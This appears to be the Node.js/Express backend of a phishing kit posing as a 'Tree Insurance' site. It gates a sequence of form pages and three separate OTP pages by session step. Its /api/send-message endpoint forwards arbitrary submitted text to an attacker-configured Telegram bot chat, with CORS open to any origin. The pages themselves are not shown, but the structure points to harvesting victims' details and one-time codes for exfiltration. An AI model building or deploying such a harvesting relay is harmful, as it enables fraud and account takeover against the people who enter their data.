const express = require('express');
const cors = require('cors');
const dotenv = require('dotenv');
const path = require('path');
const crypto = require('crypto');

dotenv.config();

const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(64).toString('hex');

const app = express();

const session = require('express-session');
app.use(session({
  secret: SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: process.env.NODE_ENV === 'production',
    httpOnly: true,
    maxAge: 30 * 60 * 1000,
    sameSite: 'strict'
  }
}));

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.set('trust proxy', 1);

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
  console.error('Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in environment.');
}

const STEPS = {
  STEP1: 'step1_completed',
  STEP2: 'step2_completed',
  STEP3: 'step3_completed'
};

const PROTECTED_PAGES = {
  'form1.html': STEPS.STEP1,
  'totalselect.html': STEPS.STEP2,
  'otp.html': STEPS.STEP2,
  'otp2.html': STEPS.STEP2,
  'otp3.html': STEPS.STEP2
};

const SESSION_INIT_PAGES = {
  'index.html': STEPS.STEP1
};

const routeProtection = (req, res, next) => {
  const requestedPath = req.path;
  const pageName = path.basename(requestedPath);

  if (SESSION_INIT_PAGES[pageName]) {
    const stepToInit = SESSION_INIT_PAGES[pageName];
    if (!req.session.completedSteps) {
      req.session.completedSteps = {};
    }
    req.session.completedSteps[stepToInit] = true;
    req.session._currentStep = stepToInit;
    req.session.lastActivity = Date.now();
    console.log('[ROUTE] Session initialized for step: ' + stepToInit);
  }

  if (PROTECTED_PAGES[pageName]) {
    const requiredStep = PROTECTED_PAGES[pageName];
    
    if (!req.session.completedSteps || !req.session.completedSteps[requiredStep]) {
      console.log('[ROUTE] Access denied to ' + pageName + '. Required step: ' + requiredStep);
      console.warn('[SECURITY] Unauthorized access attempt to ' + pageName + ' from IP: ' + req.ip);
      
      req.session.destroy((err) => {
        if (err) console.error('Session destroy error:', err);
      });
      
      return res.redirect('/');
    }
    
    console.log('[ROUTE] Access granted to ' + pageName + ' for step: ' + requiredStep);
    req.session.lastActivity = Date.now();
  }

  next();
};

app.post('/api/complete-step', (req, res) => {
  const { step, data } = req.body;
  
  if (!req.session.completedSteps) {
    req.session.completedSteps = {};
  }
  
  if (STEPS[step]) {
    req.session.completedSteps[STEPS[step]] = true;
    
    if (data) {
      if (!req.session.stepData) {
        req.session.stepData = {};
      }
      req.session.stepData[STEPS[step]] = data;
    }
    
    req.session.lastActivity = Date.now();
    console.log('[SESSION] Step completed: ' + STEPS[step]);
    
    res.json({ ok: true, message: 'Step completed', completedSteps: req.session.completedSteps });
  } else {
    res.status(400).json({ ok: false, error: 'Invalid step' });
  }
});

app.get('/api/session-status', (req, res) => {
  res.json({
    completedSteps: req.session.completedSteps || {},
    lastActivity: req.session.lastActivity,
    isValid: req.session.completedSteps && Object.keys(req.session.completedSteps).length > 0
  });
});

app.post('/api/reset-session', (req, res) => {
  req.session.destroy((err) => {
    if (err) {
      console.error('Session reset error:', err);
      return res.status(500).json({ ok: false, error: 'Failed to reset session' });
    }
    res.json({ ok: true, message: 'Session reset successfully' });
  });
});

app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'ok',
    sessionActive: !!req.session.completedSteps,
    completedSteps: req.session.completedSteps || {}
  });
});

app.post('/api/send-message', async (req, res) => {
  const { text, parse_mode = 'Markdown' } = req.body;

  if (!text || typeof text !== 'string') {
    return res.status(400).json({ ok: false, error: 'Text is required.' });
  }

  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    return res.status(500).json({ ok: false, error: 'Server is not configured with Telegram credentials.' });
  }

  try {
    const response = await fetch(
      'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage',
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: text,
          parse_mode: parse_mode,
        }),
      }
    );

    const data = await response.json();

    if (!response.ok || !data.ok) {
      return res.status(502).json({ ok: false, error: data.description || 'Telegram API error', details: data });
    }

    res.json({ ok: true, result: data.result });
  } catch (error) {
    console.error('Telegram send error:', error);
    res.status(500).json({ ok: false, error: 'Failed to send message.' });
  }
});

const BLOCKED_HTML_FILES = [
  '/form1.html',
  '/totalselect.html',
  '/otp.html',
  '/otp2.html',
  '/otp3.html',
  '/select.html'
];

const blockDirectHtmlAccess = (req, res, next) => {
  const requestedPath = '/' + path.basename(req.path);
  
  if (BLOCKED_HTML_FILES.includes(requestedPath) || BLOCKED_HTML_FILES.includes(req.path)) {
    console.log('[SECURITY] Direct access blocked: ' + req.path);
    return res.redirect('/');
  }
  next();
};

app.use(blockDirectHtmlAccess);

app.use(express.static(path.join(__dirname, 'public'), {
  index: false,
  setHeaders: (res, filePath) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('X-XSS-Protection', '1; mode=block');
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    res.setHeader('Pragma', 'no-cache');
  }
}));

const protectedPages = ['form1.html', 'totalselect.html', 'otp.html', 'otp2.html', 'otp3.html'];

protectedPages.forEach(page => {
  app.get('/' + page, routeProtection, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', page));
  });
});

app.get('/', routeProtection, (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('*.html', (req, res) => {
  console.log('[SECURITY] Blocked HTML access: ' + req.path);
  res.redirect('/');
});

const BUILD_VERSION = 'v1.1.0-SECURE';
const BUILD_DATE = new Date().toISOString();

const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log('============================================================');
  console.log('    Tree Insurance Server - SECURE BUILD');
  console.log('============================================================');
  console.log('  Version: ' + BUILD_VERSION);
  console.log('  Build:   ' + BUILD_DATE);
  console.log('  Port:    ' + port);
  console.log('------------------------------------------------------------');
  console.log('  SECURITY FEATURES:');
  console.log('  - Route Protection: ENABLED');
  console.log('  - Static HTML Block: ENABLED');
  console.log('  - Session Middleware: ENABLED');
  console.log('------------------------------------------------------------');
  console.log('  Protected Pages:');
  console.log('  - /form1.html       -> Requires Step 1');
  console.log('  - /totalselect.html -> Requires Step 2');
  console.log('  - /otp.html        -> Requires Step 2');
  console.log('  - /otp2.html       -> Requires Step 2');
  console.log('  - /otp3.html       -> Requires Step 2');
  console.log('============================================================');
});
